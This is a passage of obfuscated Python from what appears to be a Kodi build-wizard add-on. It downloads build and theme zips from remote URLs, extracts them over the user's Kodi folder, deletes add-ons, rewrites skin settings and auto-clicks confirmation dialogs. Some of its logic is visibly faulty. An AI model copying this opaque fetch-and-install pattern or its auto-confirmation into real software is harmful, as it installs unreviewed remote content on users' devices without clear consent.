			O0O00O0OO0OOOO00O .write (O00O00OOO00OO0000 .replace ('<import addon="xbmc.gui" version="5.12.0%s/>'%O0OO0O0OO00OOO00O ,'<import addon="xbmc.gui" version="5.14.0"/>'))#line:3882
			O0O00O0OO0OOOO00O .close ()#line:3883
		except :#line:3884
				pass #line:3885
		wiz .kodi17Fix ()#line:3886
		O0OOO0O0OOOOOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3887
		try :#line:3888
			O0O00O0OO0OOOO00O =open (O0OOO0O0OOOOOOO0O ,'r')#line:3889
			O00O00OOO00OO0000 =O0O00O0OO0OOOO00O .read ()#line:3890
			O0O00O0OO0OOOO00O .close ()#line:3891
			OOOO0OO000O000OOO ='<setting id="locale.keyboardlayouts" default="true(.+?)/setting>'#line:3892
			O0OO0O0OO00OOO00O =re .compile (OOOO0OO000O000OOO ).findall (O00O00OOO00OO0000 )[0 ]#line:3893
			O0O00O0OO0OOOO00O =open (O0OOO0O0OOOOOOO0O ,'w')#line:3894
			O0O00O0OO0OOOO00O .write (O00O00OOO00OO0000 .replace ('<setting id="locale.keyboardlayouts" default="true%s/setting>'%O0OO0O0OO00OOO00O ,'<setting id="locale.keyboardlayouts">English QWERTY|Hebrew QWERTY</setting>'))#line:3895
			O0O00O0OO0OOOO00O .close ()#line:3896
		except :#line:3897
				pass #line:3898
		swapSkins ('skin.Premium.mod')#line:3899
def buildWizard (OO0O0O00O000OOO0O ,OO0OO0OO00O0OO00O ,theme =None ,over =False ):#line:3902
	if over ==False :#line:3903
		O00OOO0OOO0OOOO00 =wiz .checkBuild (OO0O0O00O000OOO0O ,'url')#line:3904
		if O00OOO0OOO0OOOO00 ==False :#line:3906
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]אנא המתן...[/COLOR]'%COLOR2 )#line:3911
			xbmc .executebuiltin ("RunPlugin(plugin://plugin.program.Anonymous/?mode=install&name=+Kodi+Premium&url=gui)")#line:3912
			return #line:3913
		OO00OO00OO00OOO0O =wiz .workingURL (O00OOO0OOO0OOOO00 )#line:3914
		if OO00OO00OO00OOO0O ==False :#line:3915
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Build Zip Error: %s[/COLOR]"%(COLOR2 ,OO00OO00OO00OOO0O ))#line:3916
			return #line:3917
	if OO0OO0OO00O0OO00O =='gui':#line:3918
		if OO0O0O00O000OOO0O ==BUILDNAME :#line:3919
			if over ==True :OOOO0OOO0OOO00O00 =1 #line:3920
			else :OOOO0OOO0OOO00O00 =1 #line:3921
		else :#line:3922
			OOOO0OOO0OOO00O00 =1 #line:3923
		if OOOO0OOO0OOO00O00 :#line:3924
			remove_addons ()#line:3925
			remove_addons2 ()#line:3926
			O00O00O000OO0OO0O =wiz .checkBuild (OO0O0O00O000OOO0O ,'gui')#line:3927
			OO0O0O00O0000OO00 =OO0O0O00O000OOO0O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3928
			if not wiz .workingURL (O00O00O000OO0OO0O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3929
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3930
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0O0O00O000OOO0O ),'','אנא המתן')#line:3931
			O0O0O000OOOO0OO00 =os .path .join (PACKAGES ,'%s_guisettings.zip'%OO0O0O00O0000OO00 )#line:3932
			try :os .remove (O0O0O000OOOO0OO00 )#line:3933
			except :pass #line:3934
			logging .warning (O00O00O000OO0OO0O )#line:3935
			if 'google'in O00O00O000OO0OO0O :#line:3936
			   O0000OOO0OOOO0000 =googledrive_download (O00O00O000OO0OO0O ,O0O0O000OOOO0OO00 ,DP ,wiz .checkBuild (OO0O0O00O000OOO0O ,'filesize'))#line:3937
			else :#line:3940
			  downloader .download (O00O00O000OO0OO0O ,O0O0O000OOOO0OO00 ,DP )#line:3941
			xbmc .sleep (100 )#line:3942
			OO00OO00OO00O000O ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0O0O00O000OOO0O )#line:3943
			DP .update (0 ,OO00OO00OO00O000O ,'','אנא המתן')#line:3944
			extract .all (O0O0O000OOOO0OO00 ,HOME ,DP ,title =OO00OO00OO00O000O )#line:3945
			DP .close ()#line:3946
			wiz .defaultSkin ()#line:3947
			wiz .lookandFeelData ('save')#line:3948
			wiz .kodi17Fix ()#line:3949
			if KODIV >=18 :#line:3950
				skindialogsettind18 ()#line:3951
			xbmc .executebuiltin ("ReloadSkin()")#line:3952
			if INSTALLMETHOD ==1 :O0O000O0OO0000O0O =1 #line:3953
			elif INSTALLMETHOD ==2 :O0O000O0OO0000O0O =0 #line:3954
			else :DP .close ()#line:3955
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:3956
			update_Votes ()#line:3957
			indicatorfastupdate ()#line:3958
		else :#line:3960
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:3961
	if OO0OO0OO00O0OO00O =='gui2':#line:3962
		if OO0O0O00O000OOO0O ==BUILDNAME :#line:3963
			if over ==True :OOOO0OOO0OOO00O00 =1 #line:3964
			else :OOOO0OOO0OOO00O00 =1 #line:3965
		else :#line:3966
			OOOO0OOO0OOO00O00 =1 #line:3967
		if OOOO0OOO0OOO00O00 :#line:3968
			remove_addons ()#line:3969
			remove_addons2 ()#line:3970
			O00O00O000OO0OO0O =wiz .checkBuild (OO0O0O00O000OOO0O ,'gui')#line:3971
			OO0O0O00O0000OO00 =OO0O0O00O000OOO0O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3972
			if not wiz .workingURL (O00O00O000OO0OO0O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3973
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3974
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0O0O00O000OOO0O ),'','אנא המתן')#line:3975
			O0O0O000OOOO0OO00 =os .path .join (PACKAGES ,'%s_guisettings.zip'%OO0O0O00O0000OO00 )#line:3976
			try :os .remove (O0O0O000OOOO0OO00 )#line:3977
			except :pass #line:3978
			logging .warning (O00O00O000OO0OO0O )#line:3979
			if 'google'in O00O00O000OO0OO0O :#line:3980
			   O0000OOO0OOOO0000 =googledrive_download (O00O00O000OO0OO0O ,O0O0O000OOOO0OO00 ,DP ,wiz .checkBuild (OO0O0O00O000OOO0O ,'filesize'))#line:3981
			else :#line:3984
			  downloader .download (O00O00O000OO0OO0O ,O0O0O000OOOO0OO00 ,DP )#line:3985
			xbmc .sleep (100 )#line:3986
			OO00OO00OO00O000O ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0O0O00O000OOO0O )#line:3987
			DP .update (0 ,OO00OO00OO00O000O ,'','אנא המתן')#line:3988
			extract .all (O0O0O000OOOO0OO00 ,HOME ,DP ,title =OO00OO00OO00O000O )#line:3989
			DP .close ()#line:3990
			wiz .defaultSkin ()#line:3991
			wiz .lookandFeelData ('save')#line:3992
			if INSTALLMETHOD ==1 :O0O000O0OO0000O0O =1 #line:3995
			elif INSTALLMETHOD ==2 :O0O000O0OO0000O0O =0 #line:3996
			else :DP .close ()#line:3997
		else :#line:3999
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:4000
	elif OO0OO0OO00O0OO00O =='fresh':#line:4001
		freshStart (OO0O0O00O000OOO0O )#line:4002
	elif OO0OO0OO00O0OO00O =='normal':#line:4003
		if url =='normal':#line:4004
			if KEEPTRAKT =='true':#line:4005
				traktit .autoUpdate ('all')#line:4006
				wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4007
			if KEEPREAL =='true':#line:4008
				debridit .autoUpdate ('all')#line:4009
				wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4010
			if KEEPLOGIN =='true':#line:4011
				loginit .autoUpdate ('all')#line:4012
				wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4013
		O0OOOOOOO00O00000 =int (KODIV );O000O0000O000OOO0 =int (float (wiz .checkBuild (OO0O0O00O000OOO0O ,'kodi')))#line:4014
		if not O0OOOOOOO00O00000 ==O000O0000O000OOO0 :#line:4015
			if O0OOOOOOO00O00000 ==16 and O000O0000O000OOO0 <=15 :OOOOO0O0O0OOO00OO =False #line:4016
			else :OOOOO0O0O0OOO00OO =True #line:4017
		else :OOOOO0O0O0OOO00OO =False #line:4018
		if OOOOO0O0O0OOO00OO ==True :#line:4019
			O0OO0000000000O0O =1 #line:4020
		else :#line:4021
			if not over ==False :O0OO0000000000O0O =1 #line:4022
			else :O0OO0000000000O0O =DIALOG .yesno (ADDONTITLE ,'התקנה רגילה:','מצב זה שומר הרחבות קיימות, האם להמשיך?',nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4023
		if O0OO0000000000O0O :#line:4024
			wiz .clearS ('build')#line:4025
			O00O00O000OO0OO0O =wiz .checkBuild (OO0O0O00O000OOO0O ,'url')#line:4026
			OO0O0O00O0000OO00 =OO0O0O00O000OOO0O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4027
			if not wiz .workingURL (O00O00O000OO0OO0O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Build Install: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4028
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4029
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0O0O00O000OOO0O ,wiz .checkBuild (OO0O0O00O000OOO0O ,'version')),'','אנא המתן')#line:4030
			O0O0O000OOOO0OO00 =os .path .join (PACKAGES ,'%s.zip'%OO0O0O00O0000OO00 )#line:4031
			try :os .remove (O0O0O000OOOO0OO00 )#line:4032
			except :pass #line:4033
			logging .warning (O00O00O000OO0OO0O )#line:4034
			if 'google'in O00O00O000OO0OO0O :#line:4035
			   O0000OOO0OOOO0000 =googledrive_download (O00O00O000OO0OO0O ,O0O0O000OOOO0OO00 ,DP ,wiz .checkBuild (OO0O0O00O000OOO0O ,'filesize'))#line:4036
			else :#line:4039
			  downloader .download (O00O00O000OO0OO0O ,O0O0O000OOOO0OO00 ,DP )#line:4040
			xbmc .sleep (1000 )#line:4041
			OO00OO00OO00O000O ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0O0O00O000OOO0O ,wiz .checkBuild (OO0O0O00O000OOO0O ,'version'))#line:4042
			DP .update (0 ,OO00OO00OO00O000O ,'','Please Wait')#line:4043
			O0O000OOOO0O00000 ,O000O0OOOO00OO00O ,O0O0OOOOO0O000OO0 =extract .all (O0O0O000OOOO0OO00 ,HOME ,DP ,title =OO00OO00OO00O000O )#line:4044
			if int (float (O0O000OOOO0O00000 ))>0 :#line:4045
				try :#line:4046
					wiz .fixmetas ()#line:4047
				except :pass #line:4048
				wiz .lookandFeelData ('save')#line:4049
				wiz .defaultSkin ()#line:4050
				wiz .setS ('buildname',OO0O0O00O000OOO0O )#line:4052
				wiz .setS ('buildversion',wiz .checkBuild (OO0O0O00O000OOO0O ,'version'))#line:4053
				wiz .setS ('buildtheme','')#line:4054
				wiz .setS ('latestversion',wiz .checkBuild (OO0O0O00O000OOO0O ,'version'))#line:4055
				wiz .setS ('lastbuildcheck',str (NEXTCHECK ))#line:4056
				wiz .setS ('installed','true')#line:4057
				wiz .setS ('extract',str (O0O000OOOO0O00000 ))#line:4058
				wiz .setS ('errors',str (O000O0OOOO00OO00O ))#line:4059
				wiz .log ('INSTALLED %s: [ERRORS:%s]'%(O0O000OOOO0O00000 ,O000O0OOOO00OO00O ))#line:4060
				fastupdatefirstbuild (NOTEID )#line:4061
				wiz .kodi17Fix ()#line:4062
				skin_homeselect ()#line:4063
				skin_lower ()#line:4064
				rdbuildinstall ()#line:4065
				try :gaiaserenaddon ()#line:4066
				except :pass #line:4067
				adults18 ()#line:4068
				skinfix18 ()#line:4069
				try :os .remove (O0O0O000OOOO0OO00 )#line:4071
				except :pass #line:4072
				O0O0O000OO0000000 =(ADDON .getSetting ("auto_rd"))#line:4073
				if O0O0O000OO0000000 =='true':#line:4074
					try :#line:4075
						setautorealdebrid ()#line:4076
					except :pass #line:4077
				try :#line:4078
					autotrakt ()#line:4079
				except :pass #line:4080
				OO00000O0000OO00O =(ADDON .getSetting ("imdb_on"))#line:4081
				if OO00000O0000OO00O =='true':#line:4082
					imdb_synck ()#line:4083
				iptvset ()#line:4084
				if int (float (O000O0OOOO00OO00O ))>0 :#line:4086
					OOOO0OOO0OOO00O00 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0O0O00O000OOO0O ,wiz .checkBuild (OO0O0O00O000OOO0O ,'version')),'הושלם: [COLOR %s]%s%s[/COLOR] [שגיאות:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,O0O000OOOO0O00000 ,'%',COLOR1 ,O000O0OOOO00OO00O ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:4087
					if OOOO0OOO0OOO00O00 :#line:4088
						if isinstance (O000O0OOOO00OO00O ,unicode ):#line:4089
							O0O0OOOOO0O000OO0 =O0O0OOOOO0O000OO0 .encode ('utf-8')#line:4090
						wiz .TextBox (ADDONTITLE ,O0O0OOOOO0O000OO0 )#line:4091
				DP .close ()#line:4092
				OOOOOOOO0OOO00OOO =wiz .themeCount (OO0O0O00O000OOO0O )#line:4093
				builde_Votes ()#line:4094
				indicator ()#line:4095
				if not OOOOOOOO0OOO00OOO ==False :#line:4096
					buildWizard (OO0O0O00O000OOO0O ,'theme')#line:4097
				if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4098
				if INSTALLMETHOD ==1 :O0O000O0OO0000O0O =1 #line:4099
				elif INSTALLMETHOD ==2 :O0O000O0OO0000O0O =0 #line:4100
				else :resetkodi ()#line:4101
				if O0O000O0OO0000O0O ==1 :wiz .reloadFix ()#line:4103
				else :wiz .killxbmc (True )#line:4104
			else :#line:4105
				if isinstance (O000O0OOOO00OO00O ,unicode ):#line:4106
					O0O0OOOOO0O000OO0 =O0O0OOOOO0O000OO0 .encode ('utf-8')#line:4107
				O00OOO0O0OO0OOO00 =open (O0O0O000OOOO0OO00 ,'r')#line:4108
				OOOO00OO00O0OO0O0 =O00OOO0O0OO0OOO00 .read ()#line:4109
				O0OO000000000OO0O =''#line:4110
				for OO0O000O0OO0O0000 in O0000OOO0OOOO0000 :#line:4111
				  O0OO000000000OO0O ='key: '+O0OO000000000OO0O +'\n'+OO0O000O0OO0O0000 #line:4112
				wiz .TextBox ("%s: בעיה בהתקנת הבילד"%ADDONTITLE ,O0O0OOOOO0O000OO0 +'לפתרון הבעיה יש לשנות את התאריך במכשיר ליום אחד קודם.'+O0OO000000000OO0O )#line:4113
		else :#line:4114
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנת הבילד: מבוטלת![/COLOR]'%COLOR2 )#line:4115
	elif OO0OO0OO00O0OO00O =='theme':#line:4116
		if theme ==None :#line:4117
			OOOOOOOO0OOO00OOO =wiz .checkBuild (OO0O0O00O000OOO0O ,'theme')#line:4118
			O0O0O00000OO00O0O =[]#line:4119
			if not OOOOOOOO0OOO00OOO =='http://'and wiz .workingURL (OOOOOOOO0OOO00OOO )==True :#line:4120
				O0O0O00000OO00O0O =wiz .themeCount (OO0O0O00O000OOO0O ,False )#line:4121
				if len (O0O0O00000OO00O0O )>0 :#line:4122
					if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]The Build [COLOR %s]%s[/COLOR] comes with [COLOR %s]%s[/COLOR] different themes"%(COLOR2 ,COLOR1 ,OO0O0O00O000OOO0O ,COLOR1 ,len (O0O0O00000OO00O0O )),"Would you like to install one now?[/COLOR]",yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]"):#line:4123
						wiz .log ("Theme List: %s "%str (O0O0O00000OO00O0O ))#line:4124
						OOOO0OO000O0O0OOO =DIALOG .select (ADDONTITLE ,O0O0O00000OO00O0O )#line:4125
						wiz .log ("Theme install selected: %s"%OOOO0OO000O0O0OOO )#line:4126
						if not OOOO0OO000O0O0OOO ==-1 :theme =O0O0O00000OO00O0O [OOOO0OO000O0O0OOO ];OOO00OO0OOO0O0O00 =True #line:4127
						else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4128
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4129
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: None Found![/COLOR]'%COLOR2 )#line:4130
		else :OOO00OO0OOO0O0O00 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to install the theme:'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,theme ),'for [COLOR %s]%s v%s[/COLOR]?[/COLOR]'%(COLOR1 ,OO0O0O00O000OOO0O ,wiz .checkBuild (OO0O0O00O000OOO0O ,'version')),yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]")#line:4131
		if OOO00OO0OOO0O0O00 :#line:4132
			O00OO0OOOOO00O0OO =wiz .checkTheme (OO0O0O00O000OOO0O ,theme ,'url')#line:4133
			OO0O0O00O0000OO00 =OO0O0O00O000OOO0O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4134
			if not wiz .workingURL (O00OO0OOOOO00O0OO )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Invalid Zip Url![/COLOR]'%COLOR2 );return False #line:4135
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4136
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme ),'','Please Wait')#line:4137
			O0O0O000OOOO0OO00 =os .path .join (PACKAGES ,'%s.zip'%OO0O0O00O0000OO00 )#line:4138
			try :os .remove (O0O0O000OOOO0OO00 )#line:4139
			except :pass #line:4140
			downloader .download (O00OO0OOOOO00O0OO ,O0O0O000OOOO0OO00 ,DP )#line:4141
			xbmc .sleep (1000 )#line:4142
			DP .update (0 ,"","Installing %s "%OO0O0O00O000OOO0O )#line:4143
			O00OO00O000000O00 =False #line:4144
			if url not in ["fresh","normal"]:#line:4145
				O00OO00O000000O00 =testTheme (O0O0O000OOOO0OO00 )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4146
				O0O000OO0OOOOOOO0 =testGui (O0O0O000OOOO0OO00 )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4147
				if O00OO00O000000O00 ==True :#line:4148
					wiz .lookandFeelData ('save')#line:4149
					O0O00OO0OOOOOO000 ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4150
					O0O0000O0O0O00OO0 =xbmc .getSkinDir ()#line:4151
					skinSwitch .swapSkins (O0O00OO0OOOOOO000 )#line:4153
					O0O0O000000O0OO00 =0 #line:4154
					xbmc .sleep (1000 )#line:4155
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0O0O000000O0OO00 <150 :#line:4156
						O0O0O000000O0OO00 +=1 #line:4157
						xbmc .sleep (1000 )#line:4158
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4159
						wiz .ebi ('SendClick(11)')#line:4160
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4161
					xbmc .sleep (1000 )#line:4162
			OO00OO00OO00O000O ='[COLOR %s][B]Installing Theme:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme )#line:4163
			DP .update (0 ,OO00OO00OO00O000O ,'','אנא המתן')#line:4164
			O0O000OOOO0O00000 ,O000O0OOOO00OO00O ,O0O0OOOOO0O000OO0 =extract .all (O0O0O000OOOO0OO00 ,HOME ,DP ,title =OO00OO00OO00O000O )#line:4165
			wiz .setS ('buildtheme',theme )#line:4166
			wiz .log ('INSTALLED %s: [שגיאות:%s]'%(O0O000OOOO0O00000 ,O000O0OOOO00OO00O ))#line:4167
			DP .close ()#line:4168
			if url not in ["fresh","normal"]:#line:4169
				wiz .forceUpdate ()#line:4170
				if KODIV >=17 :wiz .kodi17Fix ()#line:4171
				if O0O000OO0OOOOOOO0 ==True :#line:4172
					wiz .lookandFeelData ('save')#line:4173
					wiz .defaultSkin ()#line:4174
					O0O0000O0O0O00OO0 =wiz .getS ('defaultskin')#line:4175
					skinSwitch .swapSkins (O0O0000O0O0O00OO0 )#line:4176
					O0O0O000000O0OO00 =0 #line:4177
					xbmc .sleep (1000 )#line:4178
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0O0O000000O0OO00 <150 :#line:4179
						O0O0O000000O0OO00 +=1 #line:4180
						xbmc .sleep (1000 )#line:4181
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4183
						wiz .ebi ('SendClick(11)')#line:4184
					wiz .lookandFeelData ('restore')#line:4185
				elif O00OO00O000000O00 ==True :#line:4186
					skinSwitch .swapSkins (O0O0000O0O0O00OO0 )#line:4187
					O0O0O000000O0OO00 =0 #line:4188
					xbmc .sleep (1000 )#line:4189
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0O0O000000O0OO00 <150 :#line:4190
						O0O0O000000O0OO00 +=1 #line:4191
						xbmc .sleep (1000 )#line:4192
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4194
						wiz .ebi ('SendClick(11)')#line:4195
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4196
					wiz .lookandFeelData ('restore')#line:4197
				else :#line:4198
					wiz .ebi ("ReloadSkin()")#line:4199
					xbmc .sleep (1000 )#line:4200
					wiz .ebi ("Container.Refresh")#line:4201
		else :#line:4202
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 )#line:4203
def skin_homeselect ():#line:4207
	try :#line:4209
		OO00OO00OOOO0OO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4210
		O00OO0O00O000OO00 =open (OO00OO00OOOO0OO00 ,'r')#line:4212
		O0O0OOO0O0OOO00OO =O00OO0O00O000OO00 .read ()#line:4213
		O00OO0O00O000OO00 .close ()#line:4214
		O0OOOO000OO0OOOOO ='<setting id="HomeS" type="string(.+?)/setting>'#line:4215
		OO0OOO000OOO00O0O =re .compile (O0OOOO000OO0OOOOO ).findall (O0O0OOO0O0OOO00OO )[0 ]#line:4216
		O00OO0O00O000OO00 =open (OO00OO00OOOO0OO00 ,'w')#line:4217
		O00OO0O00O000OO00 .write (O0O0OOO0O0OOO00OO .replace ('<setting id="HomeS" type="string%s/setting>'%OO0OOO000OOO00O0O ,'<setting id="HomeS" type="string"></setting>'))#line:4218
		O00OO0O00O000OO00 .close ()#line:4219
	except :#line:4220
		pass #line:4221
def skin_lower ():#line:4224
	O0O0OO0OOOOOOO000 =(ADDON .getSetting ("lower"))#line:4225
	if O0O0OO0OOOOOOO000 =='true':#line:4226
		try :#line:4229
			OOOOOOO0O0OOOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4230
			O0OO00O0O00O00O0O =open (OOOOOOO0O0OOOOO0O ,'r')#line:4232
			OOO0O0O00O0O000OO =O0OO00O0O00O00O0O .read ()#line:4233
			O0OO00O0O00O00O0O .close ()#line:4234
			O00000OO00O0OO00O ='<setting id="none_widget" type="bool(.+?)/setting>'#line:4235
			OOO0O000O0O00OOOO =re .compile (O00000OO00O0OO00O ).findall (OOO0O0O00O0O000OO )[0 ]#line:4236
			O0OO00O0O00O00O0O =open (OOOOOOO0O0OOOOO0O ,'w')#line:4237
			O0OO00O0O00O00O0O .write (OOO0O0O00O0O000OO .replace ('<setting id="none_widget" type="bool%s/setting>'%OOO0O000O0O00OOOO ,'<setting id="none_widget" type="bool">true</setting>'))#line:4238
			O0OO00O0O00O00O0O .close ()#line:4239
			OOOOOOO0O0OOOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4241
			O0OO00O0O00O00O0O =open (OOOOOOO0O0OOOOO0O ,'r')#line:4243
			OOO0O0O00O0O000OO =O0OO00O0O00O00O0O .read ()#line:4244
			O0OO00O0O00O00O0O .close ()#line:4245
			O00000OO00O0OO00O ='<setting id="DisableOverlayColor" type="bool(.+?)/setting>'#line:4246
			OOO0O000O0O00OOOO =re .compile (O00000OO00O0OO00O ).findall (OOO0O0O00O0O000OO )[0 ]#line:4247
			O0OO00O0O00O00O0O =open (OOOOOOO0O0OOOOO0O ,'w')#line:4248
			O0OO00O0O00O00O0O .write (OOO0O0O00O0O000OO .replace ('<setting id="DisableOverlayColor" type="bool%s/setting>'%OOO0O000O0O00OOOO ,'<setting id="DisableOverlayColor" type="bool">true</setting>'))#line:4249
			O0OO00O0O00O00O0O .close ()#line:4250
			OOOOOOO0O0OOOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4252
			O0OO00O0O00O00O0O =open (OOOOOOO0O0OOOOO0O ,'r')#line:4254
			OOO0O0O00O0O000OO =O0OO00O0O00O00O0O .read ()#line:4255
			O0OO00O0O00O00O0O .close ()#line:4256
			O00000OO00O0OO00O ='<setting id="backgroundwallpaper" type="bool(.+?)/setting>'#line:4257
			OOO0O000O0O00OOOO =re .compile (O00000OO00O0OO00O ).findall (OOO0O0O00O0O000OO )[0 ]#line:4258
			O0OO00O0O00O00O0O =open (OOOOOOO0O0OOOOO0O ,'w')#line:4259
			O0OO00O0O00O00O0O .write (OOO0O0O00O0O000OO .replace ('<setting id="backgroundwallpaper" type="bool%s/setting>'%OOO0O000O0O00OOOO ,'<setting id="backgroundwallpaper" type="bool">true</setting>'))#line:4260
			O0OO00O0O00O00O0O .close ()#line:4261
			OOOOOOO0O0OOOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4265
			O0OO00O0O00O00O0O =open (OOOOOOO0O0OOOOO0O ,'r')#line:4267
			OOO0O0O00O0O000OO =O0OO00O0O00O00O0O .read ()#line:4268
			O0OO00O0O00O00O0O .close ()#line:4269
			O00000OO00O0OO00O ='<setting id="show.clearlogo" type="bool(.+?)/setting>'#line:4270
			OOO0O000O0O00OOOO =re .compile (O00000OO00O0OO00O ).findall (OOO0O0O00O0O000OO )[0 ]#line:4271
			O0OO00O0O00O00O0O =open (OOOOOOO0O0OOOOO0O ,'w')#line:4272
			O0OO00O0O00O00O0O .write (OOO0O0O00O0O000OO .replace ('<setting id="show.clearlogo" type="bool%s/setting>'%OOO0O000O0O00OOOO ,'<setting id="show.clearlogo" type="bool">false</setting>'))#line:4273
			O0OO00O0O00O00O0O .close ()#line:4274
